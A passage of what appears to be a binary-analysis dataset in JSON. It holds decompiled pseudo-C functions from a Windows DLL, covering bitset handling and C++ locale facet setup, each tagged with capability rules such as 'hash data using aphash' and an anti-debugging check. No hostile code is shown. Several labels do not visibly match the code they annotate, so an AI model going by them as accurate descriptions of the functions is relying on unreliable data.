        "decompiled_code": "\nuchar fcn.1800171c0(ulong *arg1, ulong *arg2)\n\n{\n    char cVar1;\n    ulong uVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    uint64_t arg2_00;\n    int64_t iVar5;\n    uchar in_R8B;\n    uint32_t uVar6;\n    \n    if (arg2 != NULL) {\n        *(arg2 + 1) = 1;\n        fcn.1800178b0(arg2, 0);\n    }\n    arg1[0x13] = arg1[0x15];\n    *arg1 = arg1[0x15];\n    fcn.180017980(arg1 + 1, *(arg1 + 0xc4));\n    iVar4 = arg1[6];\n    iVar5 = arg1[5];\n    arg2_00 = *(arg1 + 0xc4);\n    uVar3 = iVar4 - iVar5 >> 4;\n    if (arg2_00 < uVar3) {\n        arg1[6] = arg2_00 * 0x10 + iVar5;\n    }\n    else if (uVar3 < arg2_00) {\n        if (arg1[7] - iVar5 >> 4 < arg2_00) {\n            fcn.18001b4e0(arg1 + 5, arg2_00);\n        }\n        else {\n            iVar5 = arg2_00 - uVar3;\n            if (iVar5 != 0) {\n                fcn.1800ae290(iVar4, 0, iVar5 * 0x10);\n                iVar4 = iVar4 + iVar5 * 0x10;\n            }\n            arg1[6] = iVar4;\n        }\n    }\n    *(arg1 + 0x1b) = in_R8B;\n    *(arg1 + 0xdc) = 10000000;\n    *(arg1 + 0xc1) = arg2 != NULL;\n    *(arg1 + 0x1c) = 600;\n    *(arg1 + 0x18) = 0;\n    cVar1 = fcn.180019100(arg1, arg1[0x16]);\n    if (cVar1 == '\\0') {\n        return 0;\n    }\n    if (arg2 != NULL) {\n        fcn.1800178b0(arg2, *(arg1 + 0xc4));\n        uVar3 = 0;\n        if (*(arg1 + 0xc4) != 0) {\n            do {\n                iVar4 = uVar3 * 0x18;\n                if ((*(arg1[9] + (uVar3 >> 5) * 4) >> (uVar3 & 0x1f) & 1) == 0) {\n                    *(arg2[2] + 0x10 + iVar4) = 0;\n                    *(iVar4 + arg2[2]) = arg1[0x14];\n                    uVar2 = arg1[0x14];\n                }\n                else {\n                    *(arg2[2] + 0x10 + iVar4) = 1;\n                    *(iVar4 + arg2[2]) = *(arg1[0xd] + uVar3 * 0x10);\n                    uVar2 = *(arg1[0xd] + 8 + uVar3 * 0x10);\n                }\n                uVar6 = uVar3 + 1;\n                uVar3 = uVar6;\n                *(iVar4 + 8 + arg2[2]) = uVar2;\n            } while (uVar6 < *(arg1 + 0xc4));\n        }\n        *arg2 = arg1[0x13];\n        iVar4 = arg1[0x13];\n        arg2[5] = iVar4;\n        iVar5 = *arg2[2];\n        arg2[6] = iVar5;\n        *(arg2 + 7) = iVar4 != iVar5;\n        iVar4 = *(arg2[2] + 8);\n        arg2[8] = iVar4;\n        iVar5 = arg1[0x14];\n        arg2[9] = iVar5;\n        *(arg2 + 10) = iVar4 != iVar5;\n        arg2[0xb] = arg1[0x14];\n        arg2[0xc] = arg1[0x14];\n    }\n    return 1;\n}\n",
        "token_count": 972
    },
    "18001798": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid fcn.180017980(int64_t *arg1, uint64_t arg2)\n\n{\n    int64_t iVar1;\n    uint64_t uVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    int64_t iVar5;\n    uchar auStack104 [32];\n    int64_t var_40h;\n    uint64_t var_38h;\n    ulong var_30h;\n    uint32_t *var_bp_20h;\n    uint64_t var_bp_18h;\n    uint64_t var_10h;\n    \n    var_10h = *0x180123080 ^ auStack104;\n    uVar2 = arg1[3];\n    if (uVar2 < arg2) {\n        iVar5 = arg2 - uVar2;\n        if ((uVar2 < 0) && (uVar2 != 0)) {\n            var_40h = -((~uVar2 >> 5) * 4 + 4);\n        }\n        else {\n            var_40h = (uVar2 >> 5) * 4;\n        }\n        var_40h = *arg1 + var_40h;\n        uVar3 = uVar2 & 0x1f;\n        var_bp_18h = uVar3;\n        var_38h = uVar3;\n        var_bp_20h = var_40h;\n        uVar2 = fcn.180017ff0(arg1, &var_40h, iVar5);\n        if ((uVar2 < 0) && (uVar2 != 0)) {\n            iVar1 = -((~uVar2 >> 5) * 4 + 4);\n        }\n        else {\n            iVar1 = (uVar2 >> 5) * 4;\n        }\n        var_bp_20h = *arg1 + iVar1;\n        uVar3 = uVar2 & 0x1f;\n        uVar2 = uVar3;\n        if ((iVar5 < 0) && (uVar2 < -iVar5)) {\n            iVar1 = -((~(uVar2 + iVar5) >> 5) * 4 + 4);\n        }\n        else {\n            iVar1 = (uVar2 + iVar5 >> 5) * 4;\n        }\n        var_bp_18h = uVar3;\n        uVar2 = var_bp_18h;\n        puVar4 = var_bp_20h;\n        while ((puVar4 != var_bp_20h + iVar1 || (uVar2 != (uVar3 + iVar5 & 0x1f)))) {\n            *puVar4 = *puVar4 & ~(1 << (uVar2 & 0x1f));\n            if (uVar2 < 0x1f) {\n                uVar2 = uVar2 + 1;\n            }\n            else {\n                uVar2 = 0;\n                puVar4 = puVar4 + 1;\n            }\n        }\n    }\n    else if (arg2 < uVar2) {\n        if ((uVar2 < 0) && (uVar2 != 0)) {\n            var_40h = -((~uVar2 >> 5) * 4 + 4);\n        }\n        else {\n            var_40h = (uVar2 >> 5) * 4;\n        }\n        var_40h = *arg1 + var_40h;\n        if ((arg2 < 0) && (arg2 != 0)) {\n            iVar5 = -((~arg2 >> 5) * 4 + 4);\n        }\n        else {\n            iVar5 = (arg2 >> 5) * 4;\n        }\n        var_bp_20h = *arg1 + iVar5;\n        var_38h = uVar2 & 0x1f;\n        var_bp_18h = arg2 & 0x1f;\n        fcn.180017d60(arg1, &var_30h, &var_bp_20h, &var_40h);\n    }\n    fcn.18008fb00(var_10h ^ auStack104);\n    return;\n}\n",
        "token_count": 908
    },
    "18001b07": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nuint64_t fcn.18001b070(int64_t arg1)\n\n{\n    uint64_t in_RAX;\n    int64_t iVar1;\n    uint64_t uVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    \n    uVar2 = 0;\n    if (*(arg1 + 0xc4) != 0) {\n        do {\n            in_RAX = uVar2 >> 5;\n            uVar3 = 1 << (uVar2 & 0x1f);\n            iVar4 = in_RAX * 4;\n            if (((*(iVar4 + *(arg1 + 0x48)) & uVar3) != 0) && (in_RAX = *(arg1 + 8),  (*(iVar4 + in_RAX) & uVar3) != 0))\n            {\n                in_RAX = *(arg1 + 0x68);\n                iVar4 = *(*(arg1 + 0x28) + uVar2 * 0x10);\n                iVar1 = *(in_RAX + uVar2 * 0x10);\n                if (iVar1 != iVar4) {\ncode_r0x00018001b0fa:\n                    uVar2 = *(arg1 + 0x98);\n                    return uVar2 & 0xffffffffffffff00 |\n                           (iVar1 - uVar2 & 0xfffffffffffffffe) < (iVar4 - uVar2 & 0xfffffffffffffffe);\n                }\n                iVar1 = *(in_RAX + 8 + uVar2 * 0x10);\n                iVar4 = *(*(arg1 + 0x28) + 8 + uVar2 * 0x10);\n                if (iVar1 != iVar4) goto code_r0x00018001b0fa;\n            }\n            uVar3 = uVar2 + 1;\n            uVar2 = uVar3;\n        } while (uVar3 < *(arg1 + 0xc4));\n    }\n    return in_RAX & 0xffffffffffffff00;\n}\n",
        "token_count": 443
    },
    "180031a0": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nuchar fcn.180031a00(ulong *arg1, ulong *arg2)\n\n{\n    char cVar1;\n    ulong uVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    uint64_t arg2_00;\n    int64_t iVar5;\n    uchar in_R8B;\n    uint32_t uVar6;\n    \n    if (arg2 != NULL) {\n        *(arg2 + 1) = 1;\n        fcn.1800178b0(arg2, 0);\n    }\n    arg1[0x13] = arg1[0x15];\n    *arg1 = arg1[0x15];\n    fcn.180017980(arg1 + 1, *(arg1 + 0xc4));\n    iVar4 = arg1[6];\n    iVar5 = arg1[5];\n    arg2_00 = *(arg1 + 0xc4);\n    uVar3 = iVar4 - iVar5 >> 4;\n    if (arg2_00 < uVar3) {\n        arg1[6] = arg2_00 * 0x10 + iVar5;\n    }\n    else if (uVar3 < arg2_00) {\n        if (arg1[7] - iVar5 >> 4 < arg2_00) {\n            fcn.18001b4e0(arg1 + 5, arg2_00);\n        }\n        else {\n            iVar5 = arg2_00 - uVar3;\n            if (iVar5 != 0) {\n                fcn.1800ae290(iVar4, 0, iVar5 * 0x10);\n                iVar4 = iVar4 + iVar5 * 0x10;\n            }\n            arg1[6] = iVar4;\n        }\n    }\n    *(arg1 + 0x1b) = in_R8B;\n    *(arg1 + 0xdc) = 10000000;\n    *(arg1 + 0xc1) = arg2 != NULL;\n    *(arg1 + 0x1c) = 600;\n    *(arg1 + 0x18) = 0;\n    cVar1 = fcn.180033350(arg1, arg1[0x16]);\n    if (cVar1 == '\\0') {\n        return 0;\n    }\n    if (arg2 != NULL) {\n        fcn.1800178b0(arg2, *(arg1 + 0xc4));\n        uVar3 = 0;\n        if (*(arg1 + 0xc4) != 0) {\n            do {\n                iVar4 = uVar3 * 0x18;\n                if ((*(arg1[9] + (uVar3 >> 5) * 4) >> (uVar3 & 0x1f) & 1) == 0) {\n                    *(arg2[2] + 0x10 + iVar4) = 0;\n                    *(iVar4 + arg2[2]) = arg1[0x14];\n                    uVar2 = arg1[0x14];\n                }\n                else {\n                    *(arg2[2] + 0x10 + iVar4) = 1;\n                    *(iVar4 + arg2[2]) = *(arg1[0xd] + uVar3 * 0x10);\n                    uVar2 = *(arg1[0xd] + 8 + uVar3 * 0x10);\n                }\n                uVar6 = uVar3 + 1;\n                uVar3 = uVar6;\n                *(iVar4 + 8 + arg2[2]) = uVar2;\n            } while (uVar6 < *(arg1 + 0xc4));\n        }\n        *arg2 = arg1[0x13];\n        iVar4 = arg1[0x13];\n        arg2[5] = iVar4;\n        iVar5 = *arg2[2];\n        arg2[6] = iVar5;\n        *(arg2 + 7) = iVar4 != iVar5;\n        iVar4 = *(arg2[2] + 8);\n        arg2[8] = iVar4;\n        iVar5 = arg1[0x14];\n        arg2[9] = iVar5;\n        *(arg2 + 10) = iVar4 != iVar5;\n        arg2[0xb] = arg1[0x14];\n        arg2[0xc] = arg1[0x14];\n    }\n    return 1;\n}\n",
        "token_count": 971
    },
    "18003485": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nuint64_t fcn.180034850(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    uint32_t uVar4;\n    \n    uVar3 = 0;\n    if (*(arg1 + 0xc4) != 0) {\n        do {\n            iVar1 = (uVar3 >> 5) * 4;\n            uVar4 = 1 << (uVar3 & 0x1f);\n            if (((*(iVar1 + *(arg1 + 0x48)) & uVar4) != 0) && ((*(iVar1 + *(arg1 + 8)) & uVar4) != 0)) {\n                iVar1 = *(*(arg1 + 0x28) + uVar3 * 0x10);\n                iVar2 = *(*(arg1 + 0x68) + uVar3 * 0x10);\n                if (iVar2 != iVar1) {\n                    uVar3 = *(arg1 + 0x98);\n                    return uVar3 & 0xffffffffffffff00 | iVar2 - uVar3 < iVar1 - uVar3;\n                }\n                iVar1 = *(*(arg1 + 0x68) + 8 + uVar3 * 0x10);\n                iVar2 = *(*(arg1 + 0x28) + 8 + uVar3 * 0x10);\n                if (iVar1 != iVar2) {\n                    uVar3 = *(arg1 + 0x98);\n                    return uVar3 & 0xffffffffffffff00 | iVar1 - uVar3 < iVar2 - uVar3;\n                }\n            }\n            uVar4 = uVar3 + 1;\n            uVar3 = uVar4;\n        } while (uVar4 < *(arg1 + 0xc4));\n    }\n    return uVar3 & 0xffffffffffffff00;\n}\n",
        "token_count": 419
    },
    "18008017": {
        "rules": [
            "check for kernel debugger via shared user data structure/3e5f0b53f7994283abe93631eebb775f"
        ],
        "decompiled_code": "\nvoid fcn.180080178(ulong arg1, ulong arg2, ulong arg3, int64_t arg4)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint8_t uVar3;\n    uint uVar4;\n    code **ppcVar5;\n    uint *puVar6;\n    code **ppcVar7;\n    code **ppcVar8;\n    code *pcVar9;\n    ulong uVar10;\n    int64_t iVar11;\n    uchar auStackX16 [8];\n    ulong var_38h;\n    code **appcStack120 [2];\n    ulong var_60h;\n    ulong var_58h;\n    ulong var_50h;\n    ulong var_30h;\n    \n    if ((arg2 & 2) != 0) {\n        if (arg4 == 0) {\n            if (*0x1801286e0 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x1801286e0 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x1801286e0 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x1801286e0;\n            ppcVar5 = fcn.18008fb2c(0x60);\n            if (ppcVar5 == NULL) {\n                ppcVar5 = NULL;\n            }\n            else {\n                *(ppcVar5 + 1) = 0;\n                *ppcVar5 = vtable.std::ctype_unsigned_short_int_.0;\n                puVar6 = fcn.18007417c(appcStack120);\n                uVar4 = puVar6[1];\n                uVar1 = puVar6[2];\n                uVar2 = puVar6[3];\n                *(ppcVar5 + 2) = *puVar6;\n                *(ppcVar5 + 0x14) = uVar4;\n                *(ppcVar5 + 3) = uVar1;\n                *(ppcVar5 + 0x1c) = uVar2;\n                uVar4 = puVar6[5];\n                uVar1 = puVar6[6];\n                uVar2 = puVar6[7];\n                *(ppcVar5 + 4) = puVar6[4];\n                *(ppcVar5 + 0x24) = uVar4;\n                *(ppcVar5 + 5) = uVar1;\n                *(ppcVar5 + 0x2c) = uVar2;\n                puVar6 = fcn.180074580(&var_50h);\n                uVar4 = puVar6[1];\n                uVar1 = puVar6[2];\n                uVar2 = puVar6[3];\n                *(ppcVar5 + 6) = *puVar6;\n                *(ppcVar5 + 0x34) = uVar4;\n                *(ppcVar5 + 7) = uVar1;\n                *(ppcVar5 + 0x3c) = uVar2;\n                uVar4 = puVar6[5];\n                uVar1 = puVar6[6];\n                uVar2 = puVar6[7];\n                *(ppcVar5 + 8) = puVar6[4];\n                *(ppcVar5 + 0x44) = uVar4;\n                *(ppcVar5 + 9) = uVar1;\n                *(ppcVar5 + 0x4c) = uVar2;\n                ppcVar5[10] = *(puVar6 + 8);\n                *(ppcVar5 + 0xb) = puVar6[10];\n            }\n            fcn.180071848(arg3, ppcVar5, iVar11);\n        }\n        else {\n            if (*0x1801286e0 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x1801286e0 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x1801286e0 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x1801286e0;\n            uVar10 = fcn.180076930(arg4);\n            fcn.180071848(arg3, uVar10, iVar11);\n        }\n    }\n    ppcVar5 = NULL;\n    if ((arg2 & 8) != 0) {\n        if (arg4 == 0) {\n            if (*0x180128920 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128920 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128920 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x180128920;\n            ppcVar7 = fcn.18008fb2c(0x10);\n            ppcVar8 = ppcVar5;\n            if (ppcVar7 != NULL) {\n                *(ppcVar7 + 1) = 0;\n                *ppcVar7 = \n                vtable.std::num_get_unsigned_short_int__class_std::istreambuf_iterator_unsigned_short_int__struct_std::char_traits_unsigned_short_int___.0\n                ;\n                ppcVar8 = ppcVar7;\n            }\n            fcn.180071848(arg3, ppcVar8, iVar11);\n            if (*0x180128928 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128928 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128928 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x180128928;\n            ppcVar8 = fcn.18008fb2c(0x10);\n            if (ppcVar8 != NULL) {\n                *(ppcVar8 + 1) = 0;\n                *ppcVar8 = \n                vtable.std::num_put_unsigned_short_int__class_std::ostreambuf_iterator_unsigned_short_int__struct_std::char_traits_unsigned_short_int___.0\n                ;\n                ppcVar5 = ppcVar8;\n            }\n            fcn.180071848(arg3, ppcVar5, iVar11);\n            if (*0x180128930 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128930 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128930 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x180128930;\n            ppcVar5 = fcn.18008fb2c(0x30);\n            if (ppcVar5 == NULL) {\n                ppcVar5 = NULL;\n            }\n            else {\n                *(ppcVar5 + 1) = 0;\n                *ppcVar5 = vtable.std::numpunct_unsigned_short_int_.0;\n                fcn.18007f534(ppcVar5);\n            }\n        }\n        else {\n            if (*0x180128920 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128920 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128920 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x180128920;\n            uVar10 = fcn.18007766c(arg4);\n            fcn.180071848(arg3, uVar10, iVar11);\n            if (*0x180128928 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128928 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128928 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x180128928;\n            uVar10 = fcn.1800778d4(arg4);\n            fcn.180071848(arg3, uVar10, iVar11);\n            if (*0x180128930 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128930 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128930 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x180128930;\n            ppcVar5 = fcn.180077b3c(arg4);\n        }\n        fcn.180071848(arg3, ppcVar5, iVar11);\n    }\n    uVar3 = fcn.180079374(0, 0);\n    if ((arg2 & (1 << (uVar3 & 0x1f)) >> 1) != 0) {\n        if (arg4 == 0) {\n            if (*0x180128938 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128938 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128938 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x180128938;\n            ppcVar5 = fcn.18008fb2c(0x20);\n            if (ppcVar5 == NULL) {\n                ppcVar5 = NULL;\n            }\n            else {\n                *(ppcVar5 + 1) = 0;\n                *ppcVar5 = vtable.std::collate_unsigned_short_int_.0;\n                puVar6 = fcn.18007436c(appcStack120);\n                uVar4 = puVar6[1];\n                uVar1 = puVar6[2];\n                uVar2 = puVar6[3];\n                *(ppcVar5 + 2) = *puVar6;\n                *(ppcVar5 + 0x14) = uVar4;\n                *(ppcVar5 + 3) = uVar1;\n                *(ppcVar5 + 0x1c) = uVar2;\n            }\n            fcn.180071848(arg3, ppcVar5, iVar11);\n        }\n        else {\n            if (*0x180128938 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128938 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128938 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x180128938;\n            uVar10 = fcn.1800767fc(arg4);\n            fcn.180071848(arg3, uVar10, iVar11);\n        }\n    }\n    ppcVar5 = NULL;\n    if ((arg2 & 0x20) != 0) {\n        if (arg4 == 0) {\n            if (*0x180128940 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128940 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128940 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x180128940;\n            ppcVar7 = fcn.18008fb2c(0x10);\n            ppcVar8 = ppcVar5;\n            if (ppcVar7 != NULL) {\n                *(ppcVar7 + 1) = 0;\n                *ppcVar7 = vtable.std::messages_unsigned_short_int_.0;\n                ppcVar8 = ppcVar7;\n            }\n        }\n        else {\n            if (*0x180128940 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128940 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128940 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x180128940;\n            ppcVar8 = fcn.180076a64(arg4);\n        }\n        fcn.180071848(arg3, ppcVar8, iVar11);\n    }\n    if ((arg2 & 4) != 0) {\n        if (arg4 == 0) {\n            if (*0x180128948 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128948 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128948 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x180128948;\n            ppcVar7 = fcn.18008fb2c(0x10);\n            ppcVar8 = ppcVar5;\n            if (ppcVar7 != NULL) {\n                *(ppcVar7 + 1) = 0;\n                *ppcVar7 = \n                vtable.std::money_get_unsigned_short_int__class_std::istreambuf_iterator_unsigned_short_int__struct_std::char_traits_unsigned_short_int___.0\n                ;\n                ppcVar8 = ppcVar7;\n            }\n            fcn.180071848(arg3, ppcVar8, iVar11);\n            if (*0x180128950 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128950 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128950 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x180128950;\n            ppcVar8 = fcn.18008fb2c(0x10);\n            if (ppcVar8 != NULL) {\n                *(ppcVar8 + 1) = 0;\n                *ppcVar8 = \n                vtable.std::money_put_unsigned_short_int__class_std::ostreambuf_iterator_unsigned_short_int__struct_std::char_traits_unsigned_short_int___.0\n                ;\n                ppcVar5 = ppcVar8;\n            }\n            fcn.180071848(arg3, ppcVar5, iVar11);\n            if (*0x180128958 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128958 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128958 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x180128958;\n            ppcVar5 = fcn.18008fb2c(0x78);\n            if (ppcVar5 != NULL) {\n                *(ppcVar5 + 1) = 0;\n                *ppcVar5 = vtable.std::_Mpunct_unsigned_short_int_.0;\n                *(ppcVar5 + 0x44) = 0;\n                fcn.18007f204(ppcVar5);\n                *ppcVar5 = vtable.std::moneypunct_unsigned_short_int__0_.0;\n            }\n            fcn.180071848(arg3, ppcVar5, iVar11);\n            if (*0x180128960 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128960 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128960 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x180128960;\n            ppcVar5 = fcn.18008fb2c(0x78);\n            if (ppcVar5 == NULL) {\n                ppcVar5 = NULL;\n            }\n            else {\n                *(ppcVar5 + 1) = 0;\n                *ppcVar5 = vtable.std::_Mpunct_unsigned_short_int_.0;\n                *(ppcVar5 + 0x44) = 1;\n                fcn.18007f204(ppcVar5);\n                *ppcVar5 = vtable.std::moneypunct_unsigned_short_int__1_.0;\n            }\n        }\n        else {\n            if (*0x180128948 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128948 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128948 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x180128948;\n            uVar10 = fcn.180076ccc(arg4);\n            fcn.180071848(arg3, uVar10, iVar11);\n            if (*0x180128950 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128950 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128950 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x180128950;\n            uVar10 = fcn.180076f34(arg4);\n            fcn.180071848(arg3, uVar10, iVar11);\n            if (*0x180128958 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128958 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128958 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x180128958;\n            uVar10 = fcn.1800772d0(arg4);\n            fcn.180071848(arg3, uVar10, iVar11);\n            if (*0x180128960 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128960 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128960 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x180128960;\n            ppcVar5 = fcn.18007719c(arg4);\n        }\n        fcn.180071848(arg3, ppcVar5, iVar11);\n    }\n    if ((arg2 & 0x10) != 0) {\n        ppcVar5 = NULL;\n        if (arg4 == 0) {\n            if (*0x180128968 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128968 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128968 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x180128968;\n            ppcVar7 = fcn.18008fb2c(0x58);\n            ppcVar8 = ppcVar5;\n            if (ppcVar7 != NULL) {\n                *(ppcVar7 + 1) = 0;\n                *ppcVar7 = \n                vtable.std::time_get_unsigned_short_int__class_std::istreambuf_iterator_unsigned_short_int__struct_std::char_traits_unsigned_short_int___.0\n                ;\n                ppcVar7[2] = NULL;\n                ppcVar7[3] = NULL;\n                ppcVar7[4] = NULL;\n                ppcVar8 = ppcVar7;\n                appcStack120[0] = ppcVar7;\n                fcn.180075be4(ppcVar7, 0, arg1);\n                uVar4 = fcn.18008fa9c(ppcVar8);\n                *(ppcVar7 + 5) = uVar4;\n                ppcVar8 = ppcVar7;\n            }\n            fcn.180071848(arg3, ppcVar8, iVar11);\n            if (*0x180128970 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128970 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128970 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x180128970;\n            ppcVar8 = fcn.18008fb2c(0x18);\n            appcStack120[0] = ppcVar8;\n            if (ppcVar8 != NULL) {\n                *(ppcVar8 + 1) = 0;\n                *ppcVar8 = \n                vtable.std::time_put_unsigned_short_int__class_std::ostreambuf_iterator_unsigned_short_int__struct_std::char_traits_unsigned_short_int___.0\n                ;\n                ppcVar8[2] = NULL;\n                pcVar9 = fcn.1800bfdf0();\n                ppcVar8[2] = pcVar9;\n                fcn.1800b2bb8(0);\n                ppcVar5 = ppcVar8;\n            }\n        }\n        else {\n            if (*0x180128968 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128968 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128968 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x180128968;\n            uVar10 = fcn.180077da4(arg4);\n            fcn.180071848(arg3, uVar10, iVar11);\n            if (*0x180128970 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x180128970 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x180128970 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x180128970;\n            ppcVar5 = fcn.18007800c(arg4);\n        }\n        fcn.180071848(arg3, ppcVar5, iVar11);\n    }\n    ppcVar5 = NULL;\n    if ((arg2 & 2) != 0) {\n        if (arg4 == 0) {\n            if (*0x1801286d8 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x1801286d8 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x1801286d8 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x1801286d8;\n            ppcVar8 = fcn.18008fb2c(0x40);\n            appcStack120[0] = ppcVar8;\n            if (ppcVar8 != NULL) {\n                *(ppcVar8 + 1) = 0;\n                *ppcVar8 = vtable.std::codecvt_unsigned_short_int__char__struct__Mbstatet_.0;\n                puVar6 = fcn.180074580(&var_50h);\n                uVar4 = puVar6[1];\n                uVar1 = puVar6[2];\n                uVar2 = puVar6[3];\n                *(ppcVar8 + 2) = *puVar6;\n                *(ppcVar8 + 0x14) = uVar4;\n                *(ppcVar8 + 3) = uVar1;\n                *(ppcVar8 + 0x1c) = uVar2;\n                uVar4 = puVar6[5];\n                uVar1 = puVar6[6];\n                uVar2 = puVar6[7];\n                *(ppcVar8 + 4) = puVar6[4];\n                *(ppcVar8 + 0x24) = uVar4;\n                *(ppcVar8 + 5) = uVar1;\n                *(ppcVar8 + 0x2c) = uVar2;\n                ppcVar8[6] = *(puVar6 + 8);\n                *(ppcVar8 + 7) = puVar6[10];\n                ppcVar5 = ppcVar8;\n            }\n        }\n        else {\n            if (*0x1801286d8 == 0) {\n                fcn.18006da30(auStackX16, 0);\n                if (*0x1801286d8 == 0) {\n                    *0x1801286b8 = *0x1801286b8 + 1;\n                    *0x1801286d8 = *0x1801286b8;\n                }\n                fcn.18006dab0(auStackX16);\n            }\n            iVar11 = *0x1801286d8;\n            ppcVar5 = fcn.1800766c8(arg4);\n        }\n        fcn.180071848(arg3, ppcVar5, 